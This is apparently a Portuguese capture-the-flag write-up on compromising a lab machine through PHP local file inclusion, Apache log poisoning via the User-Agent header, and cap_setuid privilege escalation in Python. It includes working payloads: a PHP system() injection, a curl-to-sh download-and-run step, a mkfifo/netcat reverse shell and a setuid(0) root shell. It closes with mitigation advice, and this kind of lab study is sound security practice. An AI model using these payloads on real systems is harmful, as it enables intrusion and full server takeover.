# 🎯 Writeup — Máquina Poisoning

> **Dificuldade:** Fácil/Médio | **SO:** Linux | **Tags:** `LFI` · `Log Poisoning` · `Apache access.log` · `RCE via User-Agent` · `Linux Capabilities` · `cap_setuid PrivEsc`

---

## 1. Sumário Executivo

O comprometimento total foi alcançado através de uma cadeia de exploração clássica que iniciou com uma vulnerabilidade de **Local File Inclusion (LFI)** no parâmetro `page` de uma aplicação PHP. O LFI permitiu a leitura do `access.log` do Apache, e como o PHP interpreta qualquer código embutido nos arquivos incluídos, a técnica de **Log Poisoning** foi utilizada para injetar um payload PHP no campo `User-Agent` via `curl`. O Apache gravou o payload no log, e ao incluí-lo via LFI, o servidor executou o código — resultando em **Remote Code Execution (RCE)**. Uma reverse shell foi obtida via `curl | sh` com payload `mkfifo`. A escalação de privilégios foi realizada explorando a capability `cap_setuid+ep` configurada no binário `/usr/bin/python3.6`, que permitiu alterar o UID do processo para `0` (root) e abrir um shell privilegiado.

---

## 2. Reconhecimento

### 2.1 Scan de Portas

```bash
nmap -sC -sV <IP_ALVO>
```

**Resultado:**

| Porta | Serviço |
|-------|---------|
| 80    | HTTP (Apache — aplicação PHP) |

> ⚠️ Apenas a porta 80 aberta — superfície de ataque concentrada na aplicação web.

### 2.2 Enumeração Web

Acessando a aplicação, foram identificadas duas páginas: `index.php` e `page.php`. O fuzzing de parâmetros na página principal revelou o parâmetro `page`, que aceitava caminhos de arquivos do servidor.

---

## 3. Exploração Web — LFI + Log Poisoning

### 3.1 Confirmação do LFI

O parâmetro `page` era vulnerável a **Local File Inclusion** via path traversal:

```
http://<IP_ALVO>/index.php?page=../../../../../../../../etc/passwd
```

O conteúdo do `/etc/passwd` foi renderizado na página, confirmando a inclusão arbitrária de arquivos locais.

### 3.2 Leitura do `access.log` do Apache

O arquivo de log do Apache estava acessível via path absoluto:

```
http://<IP_ALVO>/index.php?page=/var/log/apache2/access.log
```

O conteúdo do log foi renderizado no HTML, confirmando que o PHP interpreta qualquer arquivo incluído — incluindo logs com código PHP embutido.

### 3.3 Envenenamento do Log (Log Poisoning)

A técnica consiste em injetar um payload PHP no campo `User-Agent` de uma requisição HTTP. O Apache grava o User-Agent no `access.log`, e quando o PHP inclui o log via LFI, **executa o código PHP gravado**.

**Payload de confirmação (RCE):**

```bash
curl -s http://<IP_ALVO> -H "User-Agent: <?php system('id');?>"
```

Acessando o log via LFI, o output do comando `id` apareceu no HTML:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE confirmado.**

> ⚠️ **Atenção:** Payloads com `>`, `&`, `|` dentro do `system()` corrompem o parser PHP ao interpretar o log. Use aspas duplas externas no `-H` do curl com aspas simples internas no `system()`. Se o log parar de renderizar, é necessário resetar a máquina.

---

## 4. Reverse Shell — curl | sh via Servidor Python

### 4.1 Preparação do Payload

A estratégia mais confiável para obter a reverse shell é hospedar o payload em um servidor HTTP e fazer o alvo baixar e executar via pipe.

**Criar o `index.html` com o payload:**

```bash
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP_VPN> 4444>/tmp/f' > index.html
```

> ℹ️ Usar `mkfifo` evita problemas com o `sh` (dash) que não suporta `/dev/tcp`.

**Hospedar o arquivo:**

```bash
sudo python3 -m http.server 80
```

### 4.2 Listener

```bash
nc -lvnp 4444
```

### 4.3 Injeção e Acionamento

```bash
curl -s http://<IP_ALVO> -H "User-Agent: <?php system('curl <IP_VPN>|sh');?>" && \
curl -s "http://<IP_ALVO>/?page=/var/log/apache2/access.log"
```

O alvo fez o download do `index.html` e executou o payload, estabelecendo a conexão reversa como `www-data`.

---

## 5. Pós-Exploração — Estabilização do Shell e Flag de Usuário

### 5.1 Upgrade para TTY Interativo

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

### 5.2 Flag de Usuário

```bash
find /home -name "user.txt" 2>/dev/null | xargs cat
```

**Flag de Usuário:** Obtida no diretório home do usuário.

---

## 6. Escalação de Privilégios (PrivEsc) — Python cap_setuid

### 6.1 Enumeração de Capabilities

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.6  = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
```

> ⚠️ A capability `cap_setuid` permite alterar o **UID** do processo. Com `+ep` (effective + permitted), o binário pode exercer essa capability sem restrições, possibilitando elevação direta para root.

### 6.2 Exploração

```bash
python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
```

O `os.setuid(0)` define o UID como `0` (root), e `os.system('/bin/bash')` abre um shell privilegiado.

```bash
whoami
# root
```

**Escalada para root bem-sucedida.**

### 6.3 Flag de Root

```bash
cat /root/root.txt
```

**Flag de Root:** Obtida em `/root/root.txt`.

---

## 7. Diagrama da Cadeia de Ataque

```
[Aplicação PHP - index.php]
        │
        ▼
  Parâmetro page vulnerável a LFI
  (path traversal → /etc/passwd)
        │
        └─► Leitura do /var/log/apache2/access.log
                │
                └─► Log Poisoning via User-Agent
                        │
                        └─► <?php system('id');?> → RCE como www-data ✅
                                 │
                                 └─► curl <IP>|sh → Reverse Shell (mkfifo)
                                          │
                                          └─► Flag usuário
                                          │
                                          └─► getcap → python3.6 cap_setuid+ep
                                                   │
                                                   └─► os.setuid(0) → ROOT ✅
```

---

## 8. Credenciais e Flags

| Item | Valor |
|------|-------|
| **Usuário inicial** | `www-data` (via Log Poisoning → RCE) |
| **Flag Usuário** | (obtida no diretório home) |
| **Flag Root** | (obtida em `/root/root.txt`) |

---

## 9. Vulnerabilidades Identificadas

| # | Vulnerabilidade | Severidade | CVE/CWE |
|---|-----------------|------------|---------|
| 1 | Local File Inclusion (LFI) via parâmetro `page` sem sanitização | 🔴 Crítico | CWE-98 |
| 2 | Log Poisoning — Apache `access.log` acessível e interpretado pelo PHP | 🔴 Crítico | CWE-94 |
| 3 | RCE via inclusão de log envenenado com payload PHP | 🔴 Crítico | CWE-78 |
| 4 | Linux Capability `cap_setuid+ep` em binário Python acessível a usuários não-privilegiados | 🔴 Crítico | CWE-269 |
| 5 | Ausência de validação/whitelist no parâmetro `page` | 🔴 Crítico | CWE-20 |

---

## 10. Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas/serviços |
| `curl` | Injeção de payload no User-Agent e acionamento do LFI |
| `python3 -m http.server` | Servidor HTTP para hospedar payload de reverse shell |
| `netcat` (`nc`) | Listener para reverse shell |
| `getcap` | Enumeração de Linux Capabilities |
| `python3` (`os.setuid`) | Escalação de privilégios via capability `cap_setuid` |

---

## 11. Recomendações de Mitigação

1. **LFI / Path Traversal:** Nunca incluir arquivos dinamicamente com base em input do usuário. Implementar whitelist de páginas permitidas (ex: `$allowed = ['home', 'about', 'contact']`) e rejeitar qualquer valor fora da lista. Se necessário aceitar paths, usar `basename()` e `realpath()` para sanitização.
2. **Log Poisoning:** Garantir que arquivos de log do Apache (`access.log`, `error.log`) não estejam em diretórios acessíveis via inclusão PHP. Configurar permissões restritivas nos logs (`chmod 640 /var/log/apache2/*; chown root:adm /var/log/apache2/*`).
3. **PHP `include` / `require`:** Desabilitar a inclusão de arquivos remotos (`allow_url_include = Off`) e restringir o `open_basedir` para limitar quais diretórios o PHP pode acessar.
4. **Linux Capabilities:** Auditar regularmente as capabilities atribuídas a binários do sistema com `getcap -r / 2>/dev/null`. Remover capabilities desnecessárias: `setcap -r /usr/bin/python3.6`. A capability `cap_setuid` em interpretadores (Python, Perl, Ruby) é equivalente a acesso root irrestrito.
5. **Hardening geral:** Aplicar o princípio do menor privilégio em todos os binários e serviços. Utilizar ferramentas como `auditd` para monitorar alterações de UID e execuções suspeitas de comandos.
